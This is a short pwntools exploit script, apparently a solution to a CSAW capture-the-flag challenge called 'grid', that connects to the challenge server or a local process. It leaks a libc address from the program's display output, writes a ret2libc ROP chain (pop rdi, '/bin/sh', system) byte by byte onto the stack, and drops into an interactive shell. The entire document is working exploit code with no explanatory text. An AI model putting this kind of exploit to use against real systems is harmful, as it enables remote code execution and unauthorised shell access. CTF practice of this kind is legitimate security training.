from pwn import *

e = ELF("./grid")
libc = ELF("./libc.so.6")
libcstd = ELF("./libcstdc.so.6")

context.binary = e.path

is_remote = "--remote" in sys.argv
def debug():
  if not is_remote:
    gdb.attach(p)

if is_remote:
  p = remote("pwn.chal.csaw.io", 5013)
else:
  p = process(e.path, env={"LD_PRELOAD": libcstd.path + " " + libc.path})

def set(b, off):
  p.sendlineafter("shape>", b)
  p.sendlineafter("loc>", "0 " + str(off))

p.sendlineafter("shape>", "d")
p.recvuntil("Displaying\n")

curr = ""
for i in range(10):
  for j in range(10):
    curr += p.recv(1)

  assert p.recv(1) == "\n"

for i in range(8):
  print(hex(u64(curr[8*i:8*i+8])))

leak = u64(curr[16:24]) - 0x7fe0a3fa76e0 + 0x00007fe0a3831000
print(hex(leak))

rsi = 0x00400ee1          
rdi = 0x00400ee3

pay = p64(rdi + 1) + p64(rdi) + p64(leak + next(libc.search("/bin/sh"))) + p64(leak + libc.symbols["system"])
for i in range(len(pay)):
  print(i)
  set(pay[i], i + 0x78)


debug()

p.interactive()
